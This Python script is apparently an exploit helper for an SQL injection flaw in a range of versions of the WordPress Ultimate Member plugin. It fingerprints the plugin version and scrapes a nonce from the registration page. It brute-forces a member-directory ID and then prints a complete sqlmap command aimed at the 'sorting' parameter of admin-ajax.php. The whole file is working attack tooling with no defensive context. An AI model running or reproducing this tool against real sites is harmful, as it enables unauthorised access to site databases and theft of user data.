import re
import sys
import urllib3
import hashlib
import requests
import argparse
from colorama import Fore, Style
from pystyle import Colors, Colorate

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


BOLD = "\033[1m"
RESET = "\033[0m"

def check_version(target):
    try:
        r = requests.get(f"{target}/wp-content/plugins/ultimate-member/readme.txt", verify=False)
        version = re.search(r"Stable tag: (.*)", r.text).groups()[0]
    except:
        return None

    if int(version.replace(".", "")) > 212 and int(version.replace(".", "")) < 283:
        return version
    else:
        return None


def get_nonce(target):
    s = requests.Session()
    try:
        r = s.get(f"{target}/index.php/register/", verify=False)
        nonce = re.search(r'um_scripts\s*=\s*\{[^}]*"nonce":"([^"]+)"', r.text).groups()[0]
        return nonce
    except:
        return None


def get_directory_id(target, nonce):
    for num in range(1, 100):
        id = hashlib.md5(str(num).encode()).hexdigest()[10:15]
        payload = {"action": "um_get_members", "nonce": nonce, "directory_id": id}

        response = requests.post(f"{target}/wp-admin/admin-ajax.php", data=payload)
        if response.status_code == 200:
            if '"success":true' in response.text:
                return id

    return None


def scan_target(target):
    version = check_version(target)
    if version:
        nonce = get_nonce(target)
        if nonce:
            dir_id = get_directory_id(target, nonce)
            if dir_id:
                data = f"action=um_get_members&nonce={nonce}&directory_id={dir_id}&sorting=user_login"
                print(f'sqlmap --flush-session -u {target}/wp-admin/admin-ajax.php --method POST --data "{data}" --dbms mysql --technique=T -p sorting --batch')


parser = argparse.ArgumentParser()

parser.add_argument("-f", "--file", help="url")

args = parser.parse_args()

if args.file:
    scan_target(args.file.strip())
